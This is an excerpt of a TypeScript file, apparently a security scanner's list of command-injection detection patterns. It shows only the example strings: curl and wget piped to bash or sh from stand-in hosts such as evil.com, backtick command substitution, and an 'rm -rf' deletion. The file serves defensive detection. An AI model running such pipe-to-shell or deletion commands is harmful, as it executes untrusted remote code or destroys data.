...
export const commandInjectionPatterns: SecurityPattern[] = [
  ...
  },
  {
    ...
    examples: ['curl http://example.com | bash', 'cat file.txt | sh', 'echo "malicious" | zsh'],
    falsePositiveRisk: 'low',
    enabled: true,
  ...
  },
  {
    ...
    examples: ['curl http://malicious.com/script.sh | bash', 'curl -sL http://evil.com | sh'],
    falsePositiveRisk: 'low',
    enabled: true,
  ...
  },
  {
    ...
    examples: ['wget http://evil.com/script.sh -O - | bash', 'wget -qO- http://malicious.com | sh'],
    falsePositiveRisk: 'low',
    enabled: true,
  ...
  },
  {
    ...
    examples: ['`rm -rf /tmp/*`', 'echo `curl http://evil.com`', '`wget http://malicious.com`'],
